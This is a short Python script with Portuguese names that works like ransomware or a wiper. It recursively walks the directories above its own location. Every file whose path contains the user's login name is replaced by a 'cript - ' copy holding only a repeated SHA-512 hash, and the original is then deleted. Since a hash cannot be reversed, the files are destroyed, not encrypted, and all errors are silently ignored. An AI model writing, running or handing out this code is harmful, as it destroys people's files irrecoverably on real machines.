import os
from os import listdir, path, remove, getlogin
from hashlib import sha512
from threading import Thread
from sys import argv

arquivo_atual = argv
usuario = getlogin()
root_dir = '../'  # caminho relativo para o diretório pai do arquivo executável
trocar_papel_dir = os.path.expanduser('~') + '/trocar_papel'

def list_all_files(dir_path):
    for files in listdir(dir_path):
        try:
            file_path = path.join(dir_path, files)
        except:
            pass
        
        if path.isdir(file_path):
            try:
                list_all_files(file_path)
            except:
                pass

        if path.isfile(file_path):
            try:
                if usuario in path.abspath(file_path) and not path.abspath(file_path).startswith(path.abspath(trocar_papel_dir)):
                    with open(file_path, 'rb') as rb:
                        dados = rb.read()
                        criptografar = sha512(dados).hexdigest()*0xFF
                        novo_arquivo = 'cript - ' + path.basename(file_path)

                        with open(f"{dir_path}/{novo_arquivo}", 'wb') as novo:
                            novo.write(criptografar.encode())
                            novo.close()
                            rb.close()

                            remove(file_path)
            except:
                pass

thread = Thread(target=list_all_files, args=(root_dir,))
thread.start()
